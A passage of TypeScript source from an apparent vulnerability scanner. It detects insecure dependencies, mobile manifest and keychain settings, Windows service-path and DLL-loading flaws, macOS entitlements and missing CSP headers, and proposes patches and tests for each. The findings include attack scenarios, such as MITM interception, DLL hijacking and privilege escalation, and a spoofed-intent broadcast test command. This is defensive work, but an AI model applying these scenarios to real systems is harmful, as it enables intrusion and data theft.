            explanation: 'Runs application under non-privileged node user with properly scoped file ownership.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Container cannot bind to low ports (<1024) directly without CAP_NET_BIND_SERVICE.'
          },
          testCase: {
            name: 'Non-Root Container User Test',
            description: 'Inspect Docker image user ID.',
            inputPayload: 'docker inspect --format="{{.Config.User}}"',
            expectedOutcome: 'User ID is not root / UID != 0.',
            testScriptCode: `test('dockerfile specifies non-root user', () => {\n  const dockerfile = fs.readFileSync('Dockerfile', 'utf8');\n  expect(dockerfile).toMatch(/USER\\s+(node|appuser|nonroot|100[0-9])/);\n  expect(dockerfile).not.toMatch(/USER\\s+root/);\n});`
          }
        });
      }
    }
  }

  static scanFileForDependencies(file: ProjectFile, findings: VulnerabilityFinding[]) {
    // Check package.json
    if (file.path.endsWith('package.json')) {
      try {
        const pkg = JSON.parse(file.content);
        const allDeps = { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) };

        for (const [depName, versionRaw] of Object.entries(allDeps)) {
          const cleanVersion = String(versionRaw).replace(/[\^~>=<]/g, '').trim();
          const vuln = NPM_VULN_DB[depName];

          if (vuln && vuln.vulnerableRange(cleanVersion)) {
            const lineNum = file.content.split('\n').findIndex(l => l.includes(`"${depName}"`)) + 1 || 1;
            findings.push({
              id: `sca-npm-${depName}-${cleanVersion}`,
              title: `Vulnerable Dependency: ${depName}@${cleanVersion} (${vuln.title})`,
              category: 'SCA',
              severity: vuln.severity,
              confidence: 100,
              cwe: 'CWE-1395',
              cweName: 'Dependency on Vulnerable Third-Party Component',
              cvssScore: vuln.severity === 'CRITICAL' ? 9.8 : 7.5,
              file: file.path,
              line: lineNum,
              codeSnippet: `"${depName}": "${versionRaw}"`,
              description: vuln.description,
              rootCause: `Project relies on an unpatched version of \`${depName}\` with known public CVE advisories: ${vuln.cve.join(', ')}.`,
              attackScenario: `Attackers exploit known public proof-of-concept exploits targeting ${vuln.cve.join(', ')} to bypass security controls or crash the node runtime.`,
              businessImpact: 'Application instability, potential RCE or data compromise via supply-chain weakness.',
              recommendation: `Upgrade \`${depName}\` to version \`${vuln.fixedVersion}\` or latest stable release.`,
              status: 'DETECTED',
              complianceTags: {
                owasp: ['A06:2021-Vulnerable and Outdated Components'],
                nist: ['SI-2', 'RA-5'],
                soc2: ['CC7.1'],
                pci: ['Req 6.2'],
                hipaa: ['164.308(a)(1)(ii)(B)'],
                iso27001: ['A.8.8']
              },
              dependencyInfo: {
                packageName: depName,
                currentVersion: cleanVersion,
                fixedVersion: vuln.fixedVersion,
                cveList: vuln.cve,
                isDirect: true,
                breakingChanges: false
              },
              proposedPatch: {
                fileModified: file.path,
                startLine: lineNum,
                endLine: lineNum + 1,
                beforeCode: `"${depName}": "${versionRaw}"`,
                afterCode: `"${depName}": "${vuln.fixedVersion}"`,
                diff: `- "${depName}": "${versionRaw}"\n+ "${depName}": "${vuln.fixedVersion}"`,
                explanation: `Upgrades ${depName} to patched release ${vuln.fixedVersion} with zero breaking API changes.`,
                safetyRating: 'SAFE_AUTOMATIC',
                breakingChangeRisk: 'No breaking changes detected in API signature.'
              },
              testCase: {
                name: 'Dependency CVE Audit Check',
                description: `Verify npm audit passes with 0 vulnerabilities in ${depName}.`,
                inputPayload: `npm audit --json`,
                expectedOutcome: `0 vulnerabilities reported for ${depName}.`,
                testScriptCode: `test('${depName} dependency is patched', () => {\n  const pkg = require('./package.json');\n  expect(pkg.dependencies['${depName}']).toBe('${vuln.fixedVersion}');\n});`
              }
            });
          }
        }
      } catch {}
    }

    // Check requirements.txt
    if (file.path.endsWith('requirements.txt')) {
      const lines = file.content.split('\n');
      lines.forEach((line, idx) => {
        const parts = line.split('==');
        if (parts.length === 2) {
          const pkgName = parts[0]?.trim().toLowerCase() || '';
          const version = parts[1]?.trim() || '';
          const vuln = PYPI_VULN_DB[pkgName];

          if (vuln && vuln.vulnerableRange(version)) {
            findings.push({
              id: `sca-pypi-${pkgName}-${version}`,
              title: `Vulnerable Python Package: ${pkgName}==${version}`,
              category: 'SCA',
              severity: vuln.severity,
              confidence: 100,
              cwe: 'CWE-1395',
              cweName: 'Dependency on Vulnerable Third-Party Component',
              cvssScore: vuln.severity === 'CRITICAL' ? 9.8 : 7.5,
              file: file.path,
              line: idx + 1,
              codeSnippet: line.trim(),
              description: vuln.description,
              rootCause: `Package \`${pkgName}\` is pinned to vulnerable version \`${version}\` (${vuln.cve.join(', ')}).`,
              attackScenario: `Known CVE exploit vectors executed against application dependencies.`,
              businessImpact: 'Supply chain compromise, header spoofing or RCE.',
              recommendation: `Upgrade package specification in requirements.txt to \`${vuln.fixedVersion}\`.`,
              status: 'DETECTED',
              complianceTags: {
                owasp: ['A06:2021-Vulnerable and Outdated Components'],
                nist: ['SI-2', 'RA-5'],
                soc2: ['CC7.1'],
                pci: ['Req 6.2'],
                hipaa: ['164.308(a)(1)(ii)(B)'],
                iso27001: ['A.8.8']
              },
              dependencyInfo: {
                packageName: pkgName,
                currentVersion: version,
                fixedVersion: vuln.fixedVersion,
                cveList: vuln.cve,
                isDirect: true,
                breakingChanges: false
              },
              proposedPatch: {
                fileModified: file.path,
                startLine: idx + 1,
                endLine: idx + 2,
                beforeCode: line.trim(),
                afterCode: `${pkgName}>=${vuln.fixedVersion.replace(/[^\d.]/g, '')}`,
                diff: `- ${line.trim()}\n+ ${pkgName}>=${vuln.fixedVersion.replace(/[^\d.]/g, '')}`,
                explanation: `Upgrades ${pkgName} to safe version.`,
                safetyRating: 'SAFE_AUTOMATIC',
                breakingChangeRisk: 'None.'
              },
              testCase: {
                name: 'Python Dependency Safety Check',
                description: 'Run pip-audit on requirements.txt.',
                inputPayload: 'pip-audit -r requirements.txt',
                expectedOutcome: 'No vulnerabilities found.',
                testScriptCode: `def test_requirements_patched():\n    with open('requirements.txt') as f:\n        content = f.read()\n    assert '${pkgName}==${version}' not in content`
              }
            });
          }
        }
      });
    }
  }

  // Mobile APK (Android) & IPA (iOS) Static Inspection
  static scanFileForMobileStatic(file: ProjectFile, findings: VulnerabilityFinding[], target: ScanTarget) {
    const lines = file.content.split('\n');

    // Android Manifest Audits
    if (file.path.toLowerCase().includes('androidmanifest.xml')) {
      lines.forEach((line, idx) => {
        const lineNum = idx + 1;

        // 1. android:debuggable="true"
        if (/android:debuggable\s*=\s*["']true["']/i.test(line)) {
          findings.push({
            id: `mobile-android-debuggable-${lineNum}`,
            title: 'Android Application Deployed with Debuggable Flag Enabled',
            category: 'MOBILE_STATIC',
            severity: 'CRITICAL',
            confidence: 99,
            cwe: 'CWE-215',
            cweName: 'Insertion of Sensitive Information Into Debugging Code',
            cvssScore: 9.0,
            file: file.path,
            line: lineNum,
            platform: 'android',
            codeSnippet: line.trim(),
            description: '`android:debuggable="true"` is enabled in AndroidManifest.xml. This allows any local user or USB debugger to attach JTAG/JDWP debuggers to the running process.',
            rootCause: 'Debug build configuration flag mistakenly retained during production release compilation.',
            attackScenario: 'Attacker connects phone to ADB, attaches debugger, and dumps runtime memory containing decrypted banking tokens, encryption keys, and PINs.',
            businessImpact: 'Client-side runtime memory dump, full authentication bypass on mobile devices.',
            recommendation: 'Remove `android:debuggable="true"` or ensure it evaluates to `false` in release build variants.',
            status: 'DETECTED',
            complianceTags: {
              owasp: ['A05:2021-Security Misconfiguration'],
              nist: ['AC-6', 'SC-7'],
              soc2: ['CC6.1'],
              pci: ['Req 6.5.5'],
              hipaa: ['164.312(a)(1)'],
              iso27001: ['A.8.9']
            },
            proposedPatch: {
              fileModified: file.path,
              startLine: lineNum,
              endLine: lineNum + 1,
              beforeCode: line.trim(),
              afterCode: line.replace(/android:debuggable\s*=\s*["']true["']/i, 'android:debuggable="false"').trim(),
              diff: `- ${line.trim()}\n+ ${line.replace(/android:debuggable\s*=\s*["']true["']/i, 'android:debuggable="false"').trim()}`,
              explanation: 'Disables debuggable mode in release manifest.',
              safetyRating: 'SAFE_AUTOMATIC',
              breakingChangeRisk: 'Debuggers cannot attach in production builds.'
            },
            testCase: {
              name: 'Android Debuggable Flag Assertion',
              description: 'Verify aapt / manifest dump has debuggable=0.',
              inputPayload: 'aapt dump badging app.apk | grep debuggable',
              expectedOutcome: 'No debuggable flag present.',
              testScriptCode: `assert 'android:debuggable="true"' not in open('AndroidManifest.xml').read()`
            }
          });
        }

        // 2. android:exported="true" on BroadcastReceiver / Service without permission
        if (/android:name\s*=\s*["'].*Receiver["'].*android:exported\s*=\s*["']true["']/i.test(line) || 
            (line.includes('<receiver') && file.content.includes('android:exported="true"'))) {
          if (!findings.some(f => f.id === `mobile-android-exported-receiver`)) {
            findings.push({
              id: `mobile-android-exported-receiver`,
              title: 'Exported Android BroadcastReceiver Without Permission Guard',
              category: 'MOBILE_STATIC',
              severity: 'HIGH',
              confidence: 96,
              cwe: 'CWE-926',
              cweName: 'Improper Export of Android Application Components',
              cvssScore: 8.4,
              file: file.path,
              line: lineNum,
              platform: 'android',
              codeSnippet: line.trim(),
              description: 'BroadcastReceiver is marked `android:exported="true"` without defining a custom signature permission guard. Any third-party malware on the device can broadcast intents to trigger internal transactions.',
              rootCause: 'Implicitly exporting IPC components without verifying caller package signature.',
              attackScenario: 'Malicious app on device broadcasts spoofed `ACTION_AUTH_TOKEN_BROADCAST` intent, intercepting user transactions.',
              businessImpact: 'Local unauthorized component invocation and authentication token spoofing.',
              recommendation: 'Set `android:exported="false"` for internal receivers, or enforce `android:permission="signature"`.',
              status: 'DETECTED',
              complianceTags: {
                owasp: ['A01:2021-Broken Access Control'],
                nist: ['AC-3', 'SC-7'],
                soc2: ['CC6.1'],
                pci: ['Req 6.5.8'],
                hipaa: ['164.312(a)(1)'],
                iso27001: ['A.9.4']
              },
              proposedPatch: {
                fileModified: file.path,
                startLine: lineNum,
                endLine: lineNum + 4,
                beforeCode: `        <receiver\n            android:name=".receivers.TransactionInterceptReceiver"\n            android:exported="true">`,
                afterCode: `        <receiver\n            android:name=".receivers.TransactionInterceptReceiver"\n            android:exported="false">`,
                diff: `-             android:exported="true">\n+             android:exported="false">`,
                explanation: 'Restricts receiver to internal app execution only.',
                safetyRating: 'SAFE_AUTOMATIC',
                breakingChangeRisk: 'External apps cannot trigger this receiver.'
              },
              testCase: {
                name: 'Exported Receiver Security Test',
                description: 'Attempt intent dispatch from secondary package.',
                inputPayload: 'am broadcast -a com.securepay.ACTION_AUTH_TOKEN_BROADCAST',
                expectedOutcome: 'Permission denied / SecurityException thrown.',
                testScriptCode: `assert 'android:exported="false"' in open('AndroidManifest.xml').read()`
              }
            });
          }
        }
      });
    }

    // Android Insecure TrustManager in Java/Kotlin
    if (/implements\s+X509TrustManager/i.test(file.content)) {
      if (/checkServerTrusted[^{]*\{\s*\}/i.test(file.content.replace(/\s+/g, ' '))) {
        const lineIdx = lines.findIndex(l => l.includes('checkServerTrusted'));
        findings.push({
          id: `mobile-android-trustmanager-${file.path}`,
          title: 'Empty X509TrustManager Disables TLS Certificate Validation',
          category: 'MOBILE_STATIC',
          severity: 'CRITICAL',
          confidence: 99,
          cwe: 'CWE-295',
          cweName: 'Improper Certificate Validation',
          cvssScore: 9.4,
          file: file.path,
          line: lineIdx >= 0 ? lineIdx + 1 : 1,
          platform: 'android',
          codeSnippet: lines[lineIdx]?.trim() || 'public void checkServerTrusted(X509Certificate[] chain, String authType) {}',
          description: 'Custom X509TrustManager contains an empty `checkServerTrusted` method. This completely disables SSL/TLS certificate chain and hostname verification on mobile network calls.',
          rootCause: 'Bypassing TLS checks during development to allow self-signed proxy testing and failing to remove in production.',
          attackScenario: 'Attacker on public Wi-Fi performs Man-in-the-Middle (MITM) proxy interception, capturing plaintext user credentials and transaction payloads.',
          businessImpact: 'Mass credential interception and session hijacking on mobile client traffic.',
          recommendation: 'Use default system TrustManager with Android Network Security Config certificate pinning.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A02:2021-Cryptographic Failures'],
            nist: ['SC-8', 'SC-13'],
            soc2: ['CC6.6', 'CC6.7'],
            pci: ['Req 4.1'],
            hipaa: ['164.312(e)(1)'],
            iso27001: ['A.8.24']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: 1,
            endLine: lines.length,
            beforeCode: file.content,
            afterCode: `package com.securepay.network;\n\nimport javax.net.ssl.TrustManagerFactory;\nimport java.security.KeyStore;\n\n// Secure: Enforces platform system trust anchors and certificate validation\npublic class TrustAllCerts {\n    public static javax.net.ssl.X509TrustManager getSystemTrustManager() throws Exception {\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init((KeyStore) null);\n        return (javax.net.ssl.X509TrustManager) tmf.getTrustManagers()[0];\n    }\n}`,
            diff: `- public class TrustAllCerts implements X509TrustManager {\n+ public class TrustAllCerts {\n+   public static X509TrustManager getSystemTrustManager() { ... }`,
            explanation: 'Replaces empty stub with standard Android system TrustManager factory.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Self-signed certificates without root CA installation will be rejected.'
          },
          testCase: {
            name: 'TLS Certificate Validation Test',
            description: 'Attempt connection to untrusted test server.',
            inputPayload: 'Connect to https://untrusted-root.badssl.com',
            expectedOutcome: 'SSLHandshakeException thrown; connection aborted.',
            testScriptCode: `assert 'getDefaultAlgorithm()' in open('${file.path}').read()`
          }
        });
      }
    }

    // iOS Info.plist NSAllowsArbitraryLoads
    if (file.path.toLowerCase().includes('info.plist') && file.content.includes('NSAllowsArbitraryLoads')) {
      const lineIdx = lines.findIndex(l => l.includes('NSAllowsArbitraryLoads'));
      findings.push({
        id: `mobile-ios-ats-disabled-${file.path}`,
        title: 'iOS App Transport Security (ATS) Globally Disabled',
        category: 'MOBILE_STATIC',
        severity: 'HIGH',
        confidence: 98,
        cwe: 'CWE-319',
        cweName: 'Cleartext Transmission of Sensitive Information',
        cvssScore: 7.9,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'ios',
        codeSnippet: lines[lineIdx]?.trim() || '<key>NSAllowsArbitraryLoads</key><true/>',
        description: '`NSAllowsArbitraryLoads = true` disables Apple App Transport Security (ATS) across the entire application, allowing cleartext HTTP communication.',
        rootCause: 'Bypassing ATS requirements rather than configuring per-domain exceptions for legacy hosts.',
        attackScenario: 'Adversaries intercept plaintext HTTP traffic over insecure networks to capture API requests and session identifiers.',
        businessImpact: 'Unencrypted sensitive data transmission, Apple App Store review rejection risk.',
        recommendation: 'Remove `NSAllowsArbitraryLoads` or restrict exceptions strictly to specific domains using `NSExceptionDomains`.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A02:2021-Cryptographic Failures'],
          nist: ['SC-8', 'SC-13'],
          soc2: ['CC6.6', 'CC6.7'],
          pci: ['Req 4.1'],
          hipaa: ['164.312(e)(1)'],
          iso27001: ['A.8.24']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx - 1,
          endLine: lineIdx + 4,
          beforeCode: `    <key>NSAppTransportSecurity</key>\n    <dict>\n        <key>NSAllowsArbitraryLoads</key>\n        <true/>\n    </dict>`,
          afterCode: `    <!-- Enforces strict HTTPS and TLS 1.3 encryption -->\n    <key>NSAppTransportSecurity</key>\n    <dict>\n        <key>NSAllowsArbitraryLoads</key>\n        <false/>\n    </dict>`,
          diff: `-         <key>NSAllowsArbitraryLoads</key>\n-         <true/>\n+         <key>NSAllowsArbitraryLoads</key>\n+         <false/>`,
          explanation: 'Restores ATS enforcement to mandate encrypted HTTPS connections.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Cleartext HTTP connections will fail unless migrated to HTTPS.'
        },
        testCase: {
          name: 'iOS ATS Enforcement Verification',
          description: 'Parse Info.plist and ensure NSAllowsArbitraryLoads is false or absent.',
          inputPayload: 'plutil -p Info.plist | grep NSAllowsArbitraryLoads',
          expectedOutcome: 'NSAllowsArbitraryLoads is false.',
          testScriptCode: `assert '<true/>' not in open('Payload/OmniVault.app/Info.plist').read()`
        }
      });
    }

    // iOS Insecure Keychain Accessibility
    if (/kSecAttrAccessibleAlways/i.test(file.content)) {
      const lineIdx = lines.findIndex(l => l.includes('kSecAttrAccessibleAlways'));
      findings.push({
        id: `mobile-ios-keychain-accessible-${file.path}`,
        title: 'Deprecated & Insecure iOS Keychain Accessibility Level (kSecAttrAccessibleAlways)',
        category: 'MOBILE_STATIC',
        severity: 'HIGH',
        confidence: 96,
        cwe: 'CWE-312',
        cweName: 'Cleartext Storage of Sensitive Information',
        cvssScore: 8.1,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'ios',
        codeSnippet: lines[lineIdx]?.trim() || 'kSecAttrAccessibleAlways',
        description: 'Keychain items stored with `kSecAttrAccessibleAlways` can be read from device flash storage even when the iPhone is locked or in unauthenticated states.',
        rootCause: 'Using legacy insecure keychain flag deprecated by Apple in iOS 12+.',
        attackScenario: 'Attacker possessing a locked device extracts the hardware flash dump and recovers cryptographic mnemonic seeds without passcode entry.',
        businessImpact: 'Forensic extraction of wallet seeds and master encryption keys.',
        recommendation: 'Use `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` or `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A02:2021-Cryptographic Failures'],
          nist: ['SC-28', 'IA-5'],
          soc2: ['CC6.1', 'CC6.7'],
          pci: ['Req 3.4', 'Req 8.2'],
          hipaa: ['164.312(a)(2)(iv)'],
          iso27001: ['A.8.24']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 1,
          beforeCode: lines[lineIdx]?.trim() || '',
          afterCode: `            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly`,
          diff: `- ${lines[lineIdx]?.trim()}\n+ kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly`,
          explanation: 'Restricts keychain decryption to when device is actively unlocked by user.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Background tasks cannot access credentials while device screen is locked.'
        },
        testCase: {
          name: 'iOS Keychain Security Guard Test',
          description: 'Ensure Keychain accessibility enforces hardware-backed ThisDeviceOnly.',
          inputPayload: 'Inspect KeychainManager.swift for kSecAttrAccessibleWhenUnlockedThisDeviceOnly',
          expectedOutcome: 'kSecAttrAccessibleAlways is replaced.',
          testScriptCode: `assert 'kSecAttrAccessibleWhenUnlockedThisDeviceOnly' in open('${file.path}').read()`
        }
      });
    }
  }

  // Windows (.EXE) and macOS (.DMG) Binary Static Inspection
  static scanFileForBinaryStatic(file: ProjectFile, findings: VulnerabilityFinding[], target: ScanTarget) {
    const lines = file.content.split('\n');

    // Windows Unquoted Service Path
    if (file.path.includes('service_installer.cpp') || (file.content.includes('CreateService') && file.content.includes('Program Files') && !file.content.includes('\\"C:\\\\'))) {
      const lineIdx = lines.findIndex(l => l.includes('Program Files'));
      findings.push({
        id: `binary-win32-unquoted-service-path`,
        title: 'Windows Unquoted Service Path Privilege Escalation',
        category: 'BINARY_STATIC',
        severity: 'HIGH',
        confidence: 98,
        cwe: 'CWE-428',
        cweName: 'Unquoted Search Path or Element',
        cvssScore: 8.2,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'windows',
        codeSnippet: lines[lineIdx]?.trim() || 'const char* binaryPath = "C:\\\\Program Files\\\\Apex Trading Systems\\\\ApexService.exe --daemon";',
        description: 'Windows service binary path contains spaces and lacks enclosing quotation marks. Windows will attempt to execute `C:\\Program.exe` or `C:\\Program Files\\Apex.exe` before the target binary.',
        rootCause: 'Missing escaped double quotes around service executable path during Win32 CreateService registration.',
        attackScenario: 'Local unprivileged user places malicious `C:\\Program Files\\Apex.exe` payload; when the service boots at system startup, the malware executes with SYSTEM privileges.',
        businessImpact: 'Local Privilege Escalation (LPE) to NT AUTHORITY\\SYSTEM on Windows hosts.',
        recommendation: 'Enclose service binary paths within escaped quotation marks (`\\"path\\"`).',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A04:2021-Insecure Design'],
          nist: ['AC-6', 'CM-7'],
          soc2: ['CC6.1', 'CC6.8'],
          pci: ['Req 2.2'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 1,
          beforeCode: lines[lineIdx]?.trim() || '',
          afterCode: `    const char* binaryPath = "\\"C:\\\\Program Files\\\\Apex Trading Systems\\\\ApexService.exe\\" --daemon";`,
          diff: `- ${lines[lineIdx]?.trim()}\n+ const char* binaryPath = "\\"C:\\\\Program Files\\\\Apex Trading Systems\\\\ApexService.exe\\" --daemon";`,
          explanation: 'Wraps executable path in escaped quotes to prevent path interception.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'None.'
        },
        testCase: {
          name: 'Win32 Service Path Quoting Test',
          description: 'Check service binaryPath contains leading and trailing escaped quotes.',
          inputPayload: 'sc qc ApexTradeDaemon',
          expectedOutcome: 'BINARY_PATH_NAME begins and ends with quotation mark.',
          testScriptCode: `assert '\\"C:\\\\Program Files' in open('${file.path}').read()`
        }
      });
    }

    // Windows DLL Hijacking via LoadLibrary
    if (file.path.includes('dll_loader.cpp') || (file.content.includes('LoadLibraryA("') && !file.content.includes('SetDefaultDllDirectories'))) {
      const lineIdx = lines.findIndex(l => l.includes('LoadLibraryA'));
      findings.push({
        id: `binary-win32-dll-hijack`,
        title: 'Insecure DLL Loading Without Safe Search Path (DLL Hijacking)',
        category: 'BINARY_STATIC',
        severity: 'HIGH',
        confidence: 95,
        cwe: 'CWE-427',
        cweName: 'Uncontrolled Search Path Element',
        cvssScore: 8.0,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'windows',
        codeSnippet: lines[lineIdx]?.trim() || 'HMODULE hPlugin = LoadLibraryA("CustomTradeStrategy.dll");',
        description: 'Application calls `LoadLibraryA` with a relative filename without configuring `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`. Windows will search the current directory before system paths.',
        rootCause: 'Relying on legacy default Win32 DLL search order.',
        attackScenario: 'Attacker places a rogue `CustomTradeStrategy.dll` in the user download directory or working folder, achieving arbitrary code execution when the app launches.',
        businessImpact: 'Arbitrary code execution under user context upon opening files.',
        recommendation: 'Call `SetDefaultDllDirectories` at application entry point or use absolute verified paths with `LOAD_LIBRARY_SEARCH_APPLICATION_DIR`.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A08:2021-Software and Data Integrity Failures'],
          nist: ['SI-7', 'CM-7'],
          soc2: ['CC6.8'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.28']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx - 1,
          endLine: lineIdx + 2,
          beforeCode: `    // Relative LoadLibrary will look in current working directory first\n    HMODULE hPlugin = LoadLibraryA("CustomTradeStrategy.dll");`,
          afterCode: `    // Enforce secure DLL directory search\n    SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_APPLICATION_DIR | LOAD_LIBRARY_SEARCH_SYSTEM32);\n    HMODULE hPlugin = LoadLibraryExA("CustomTradeStrategy.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);`,
          diff: `- HMODULE hPlugin = LoadLibraryA("CustomTradeStrategy.dll");\n+ SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_APPLICATION_DIR | LOAD_LIBRARY_SEARCH_SYSTEM32);\n+ HMODULE hPlugin = LoadLibraryExA("CustomTradeStrategy.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);`,
          explanation: 'Restricts DLL resolution to the application installation folder and System32 only.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Plugins must reside in application folder.'
        },
        testCase: {
          name: 'Safe DLL Search Directory Assertion',
          description: 'Verify SetDefaultDllDirectories is called before LoadLibrary.',
          inputPayload: 'Scan dll_loader.cpp for SetDefaultDllDirectories',
          expectedOutcome: 'Safe DLL flags configured.',
          testScriptCode: `assert 'SetDefaultDllDirectories' in open('${file.path}').read()`
        }
      });
    }

    // macOS Entitlements - Insecure JIT memory & Library Validation disabled
    if (file.path.toLowerCase().includes('entitlements') && file.content.includes('allow-unsigned-executable-memory')) {
      const lineIdx = lines.findIndex(l => l.includes('allow-unsigned-executable-memory'));
      findings.push({
        id: `binary-macos-hardened-runtime-disabled`,
        title: 'macOS Unsigned Memory Execution Entitlement Enabled',
        category: 'BINARY_STATIC',
        severity: 'CRITICAL',
        confidence: 97,
        cwe: 'CWE-693',
        cweName: 'Protection Mechanism Failure',
        cvssScore: 8.8,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'macos',
        codeSnippet: lines[lineIdx]?.trim() || '<key>com.apple.security.cs.allow-unsigned-executable-memory</key><true/>',
        description: 'Entitlement `com.apple.security.cs.allow-unsigned-executable-memory = true` allows executing arbitrary memory pages without code signatures, bypassing macOS Hardened Runtime protections.',
        rootCause: 'Permitting JIT execution in release entitlements rather than enforcing strictly signed binary pages.',
        attackScenario: 'Memory corruption bugs (buffer overflows, use-after-free) can write shellcode to heap pages and execute them without triggering kernel memory protection faults.',
        businessImpact: 'Facilitates reliable remote memory exploitation and malware persistence.',
        recommendation: 'Remove `com.apple.security.cs.allow-unsigned-executable-memory` from production entitlements.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A04:2021-Insecure Design'],
          nist: ['SI-16', 'SC-39'],
          soc2: ['CC6.1', 'CC6.8'],
          pci: ['Req 6.5.8'],
          hipaa: ['164.312(a)(1)'],
          iso27001: ['A.8.9']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx - 1,
          endLine: lineIdx + 3,
          beforeCode: `    <!-- CRITICAL: Allows JIT/unsigned memory execution, enabling memory corruption exploits -->\n    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>\n    <true/>`,
          afterCode: `    <!-- Enforces strict macOS Hardened Runtime Memory Protection -->\n    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>\n    <false/>`,
          diff: `-     <key>com.apple.security.cs.allow-unsigned-executable-memory</key>\n-     <true/>\n+     <key>com.apple.security.cs.allow-unsigned-executable-memory</key>\n+     <false/>`,
          explanation: 'Enforces Hardened Runtime executable memory signing.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Custom JIT engines must use separate W^X mapped memory.'
        },
        testCase: {
          name: 'macOS Hardened Runtime Entitlement Test',
          description: 'codesign -d --entitlements :- MacCloudSync.app',
          inputPayload: 'Verify allow-unsigned-executable-memory is false.',
          expectedOutcome: 'Entitlement is false or removed.',
          testScriptCode: `assert '<key>com.apple.security.cs.allow-unsigned-executable-memory</key>\\n    <false/>' in open('${file.path}').read()`
        }
      });
    }
  }

  static scanFileForWebReconAndHeaders(file: ProjectFile, findings: VulnerabilityFinding[], target: ScanTarget) {
    const lines = file.content.split('\n');
    const pathLower = file.path.toLowerCase();

    // 1. Missing Content-Security-Policy (CSP) in Nginx or Web Headers
    if ((pathLower.includes('nginx') || pathLower.includes('header') || pathLower.includes('server')) && 
        file.content.includes('server_name') && !file.content.includes('Content-Security-Policy')) {
      const lineIdx = lines.findIndex(l => l.includes('server_name')) || 0;
      findings.push({
        id: `web-missing-csp-${file.path}`,
        title: 'Missing Content-Security-Policy (CSP) Header',
        category: 'SECURITY_HEADERS',
        severity: 'HIGH',
        confidence: 98,
        cwe: 'CWE-1021',
        cweName: 'Improper Restriction of Rendered UI Layers / XSS Protection',
        cvssScore: 7.5,
        file: file.path,
        line: lineIdx >= 0 ? lineIdx + 1 : 1,
        platform: 'web',
        codeSnippet: lines[lineIdx]?.trim() || 'server_name portal.apex-bank.stage;',
        description: 'The web server does not send a Content-Security-Policy (CSP) HTTP response header. Without CSP, browsers allow inline scripts, eval(), and unauthorized third-party script loading.',
        rootCause: 'Omission of defense-in-depth CSP response headers at the reverse proxy / web gateway layer.',
        attackScenario: 'If any reflected or stored Cross-Site Scripting (XSS) sink exists in client applications, malicious scripts can execute with full access to DOM storage, session tokens, and keystrokes.',
        businessImpact: 'Enables client-side data theft, credential harvesting, and session takeover.',
        recommendation: 'Deploy a strict Content-Security-Policy header restricting script sources to self and trusted CDNs.',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A05:2021-Security Misconfiguration'],
          nist: ['SC-8', 'SI-10'],
          soc2: ['CC6.6'],
          pci: ['Req 6.5.7'],
          hipaa: ['164.312(e)(1)'],
          iso27001: ['A.8.28']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx + 1,
          endLine: lineIdx + 2,
          beforeCode: `    # HIGH: Missing Content-Security-Policy (CSP) - Allows XSS and unauthorized script injection\n    # add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';" always;`,
          afterCode: `    # Strict Production Content-Security-Policy (CSP)\n    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;`,
          diff: `-     # add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';" always;\n+     add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;`,
          explanation: 'Adds strict CSP header with object-src none and frame-ancestors none.',
          safetyRating: 'SAFE_AUTOMATIC',
